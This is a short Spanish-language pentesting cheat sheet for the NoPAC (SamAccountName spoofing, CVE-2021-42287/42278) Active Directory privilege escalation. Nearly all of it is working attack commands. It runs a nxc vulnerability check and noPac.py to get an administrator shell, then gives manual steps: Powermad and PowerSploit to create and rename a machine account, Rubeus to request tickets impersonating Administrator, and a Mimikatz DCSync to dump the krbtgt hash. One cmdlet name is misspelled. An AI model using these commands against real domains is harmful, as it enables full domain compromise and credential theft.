# NoPAC

Tags: #AD #Windows 

```bash 
# SamAccountName Spoofing CVE-2021-42287, CVE-2021-42278 y es una vulnerabilidad para elevar privilegios 

Pasos: 
1. Crear una cuenta de computador 
2. Limpiar el SPN
3. Cambiar SamAccountName por el nombre del Domain Controller (sin $)
4. Solicitar el TGT 
5. Cambiar SamAccountName por el original 
6. Obtener el TGS
7. Obtener acceso 

# Con credenciales validas 
> nxc smb IP -u 'user' -p 'passwd' -M nopac   # Verificar si el DC tiene la vulne
	# M = Ingresar un módulo 

# Utilizar la tool 'NoPac'
> python noPac.py domain.corp/user:'passwd' -dc-ip IP -dc-host DC_Name -shell --impersonate administrator 
```

## Forma manual 

```bash 
# Forma Manual ingresando al Windows con credenciales validas 

> Import-Module .\Powermad.psm1    # Importar el módulo 
> New-MachineAccount -MachineAccount "PC01" -Domain "domain.corp" -DomainController "DC_Name.domain.corp"    # Crear una cuenta y agregar una passwd

> Import-Module .\PowerSploit.psm1 
> Set-DomainObject "CN=PC01,CN=Computers,DC=domain,DC=corp" -Clear "Serviceprincipalname"   # Limpiar el SPN

> Set-MachineAccounAttribute -MachineAccount "PC01" -Value "DC_Name" -Attribute "samaccountname"         # Cambiar el samaccountname (sin $)

> .\Rubeus.exe asktgt /user:"DC_Name" /password:"passwd" /domain:"domain.corp" /dc:"DC_Name.domain.corp" /nowrap      # Solicitar el TGT 

> Set-MachineAccounAttribute -MachineAccount "PC01" -Value "PC01$" -Attribute "samaccountname"         # Regresar el samaccountname al original (agregar $)

# Solicitar el TGS agregando el TGT obtenido anteriormente
> .\Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"cifs/DC_Name.domain.corp" /dc:"DC_Name.domain.corp" /ptt /ticket:TGT
```

## DCSync 

```bash 
# Con TGS del administrator se puede hacer un DCSync para obtener el hash NTLM del usuario krbtgt 
> .\Mimikatz.exe # lsadump::dcsync /domain:domain.corp /kdc:DC_Name.domain.corp /user:krbtgt 
```